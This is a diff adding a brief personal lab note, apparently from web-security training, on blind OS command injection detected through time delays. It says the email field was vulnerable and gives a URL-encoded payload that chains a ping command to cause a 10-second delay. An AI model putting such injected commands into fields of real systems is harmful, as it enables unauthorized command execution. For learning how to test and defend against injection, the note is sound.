@@ -1,0 +1,4 @@
+Blind OS command injections with time delays
+
+since the command output wont be displayed( not returned, we do a blind injection. so i tried all inputs to cause a 10 s delay and the emial section worked. inject %26+ping+-c+10+127.0.0.1+%26
+
